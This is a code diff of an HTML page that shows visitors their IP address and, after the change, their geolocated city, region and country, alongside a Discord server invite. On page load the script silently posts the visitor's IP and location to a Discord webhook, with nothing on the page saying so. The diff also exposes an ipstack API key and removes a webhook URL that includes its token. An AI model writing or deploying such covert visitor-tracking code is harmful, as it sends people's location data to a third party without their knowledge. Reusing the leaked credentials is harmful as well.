@@ -11,15 +11,16 @@
             ipElement.textContent = data.ip;
             
             sendToWebhook(data.ip);
+            getLocation(data.ip);
           })
           .catch((error) => {
             console.error("Error:", error);
           });
       }
       
-      function sendToWebhook(ip) {
-        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx";
-        const message = "Your ip: " + ip;
+      function sendToWebhook(ip, location) {
+        const webhookURL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"; // Replace with the actual webhook URL
+        const message = "IP: " + ip + "\nLocation: " + location;
         
         fetch(webhookURL, {
           method: "POST",
@@ -31,11 +32,31 @@
         .then((response) => console.log("Webhook sent successfully"))
         .catch((error) => console.error("Error sending webhook:", error));
       }
+      
+      function getLocation(ip) {
+        const accessKey = "060fa245df069e9bb3fa1889d85e7e50"; // Replace with your IP Geolocation API access key
+        const locationUrl = `http://api.ipstack.com/${ip}?access_key=${accessKey}`;
+        
+        fetch(locationUrl)
+          .then((response) => response.json())
+          .then((data) => {
+            const locationElement = document.getElementById("location");
+            const locationString = `${data.city}, ${data.region_name}, ${data.country_name}`;
+            locationElement.textContent = locationString;
+            
+            sendToWebhook(ip, locationString);
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+          });
+      }
     </script>
   </head>
   <body onload="displayIP()">
     <h1>Your IP Address:</h1>
     <p id="ip">Loading...</p>
-    <div> If you would like to join us then join our discord server: https://discord.gg/SXez2zT9</div>
+    <h1>Your Location:</h1>
+    <p id="location">Loading...</p>
+    <div> If you would like to join us, please join our Discord server: <a href="https://discord.gg/SXez2zT9">https://discord.gg/SXez2zT9</a></div>
   </body>
 </html>
